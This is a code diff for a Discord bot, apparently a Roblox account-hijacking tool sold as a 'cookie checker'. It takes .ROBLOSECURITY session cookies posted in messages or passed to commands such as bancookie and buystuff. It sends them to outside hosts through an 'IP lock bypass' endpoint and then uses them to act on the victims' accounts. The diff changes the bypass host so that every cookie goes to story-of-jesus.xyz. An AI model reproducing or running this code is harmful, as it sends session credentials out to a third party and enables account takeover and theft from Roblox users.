@@ -14,7 +14,7 @@ bot = commands.Bot(command_prefix=yourprefix, description="Cookie Checker Bot :)
 async def on_message(message):
 
     if message.content.startswith("_|WARNING:-DO-NOT-SHARE-THIS."):
-        cookie = requests.get(f"https://robloxapi.eu/info/iplockbypass?cookie={message.content}").text ## bypassip lock
+        cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={message.content}").text ## bypassip lock
         r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}') 
         data = r.json() 
 
@@ -39,7 +39,7 @@ async def bancookie(ctx, cookie=None):
     if cookie == None:
         await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!bancookie mycookie'") ## let the user know they aint provided cookie
         return ## break command
-    cookie = requests.get(f"https://robloxapi.eu/info/iplockbypass?cookie={cookie}").text ## bypass ip lock
+    cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={cookie}").text ## bypass ip lock
     req1.cookies['.ROBLOSECURITY'] = cookie
     print("Cookie Set")
     homeurl= 'https://www.roblox.com/build/upload' ## link to get verification token
@@ -77,7 +77,7 @@ async def buystuff(ctx, cookie=None):
         await ctx.message.reply("Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '!buystuff mycookie'") ## let the user know they aint provided cookie
         return ## break command
     
-    cookie = requests.get(f"https://robloxapi.eu/info/iplockbypass?cookie={cookie}").text ## bypass ip lock
+    cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={cookie}").text ## bypass ip lock
     r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
     if r.json()["status"] == "failed": 
         await ctx.message.reply("Hmm. This Cookie Seems To Be Expired/Invalid.")
